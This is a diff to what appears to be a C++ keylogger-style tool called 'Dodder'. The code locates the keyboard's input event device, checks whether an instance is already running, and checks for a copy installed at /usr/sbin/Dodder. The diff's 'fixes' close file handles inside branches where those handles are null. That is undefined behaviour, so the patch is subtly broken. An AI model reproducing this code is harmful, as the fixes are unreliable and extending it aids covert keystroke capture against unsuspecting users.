@@ -63,11 +63,15 @@ void getKeyboardFile(char *path)
     //const char *str = "/dev/input/event4";
     FILE *pCommand = popen("grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'", "r");
     if(pCommand == nullptr)
+    {
+        pclose(pCommand);
         throw std::runtime_error("unable to run the command");
+    }
     char dummy[200];
     fgets(dummy, 199, pCommand);
     std::string kbdLocation = std::string("/dev/input/") + dummy;
     strcpy(path, kbdLocation.c_str());
+    pclose(pCommand);
 }
 
 /**
@@ -110,7 +114,10 @@ static const int maxProcessId(void)
     char str[15];
     p = fopen("/proc/sys/kernel/pid_max", "r");
     if(p == nullptr)
+    {
+        fclose(p);  
         throw std::runtime_error("unable to get the max pid");
+    }
     fgets(str, 15, p);
     int maxpid = atoi(str);
     fclose(p);
@@ -132,10 +139,13 @@ const bool processAlreadyRunning(void)
             if(S == "Dodder\n" && i != getpid())
             {
                 std::cout << S;
+                fclose(p);
                 return true;
             }
         }
+        fclose(p);
     }
+    
     return false;
 
 }
@@ -144,7 +154,10 @@ const bool checkForConquer(void)
 {
     FILE *p = fopen("/usr/sbin/Dodder", "rb");
     if(p == nullptr)
+    {     
+        fclose(p);
         return false;
+    }
     fclose(p);
     return true;
 }
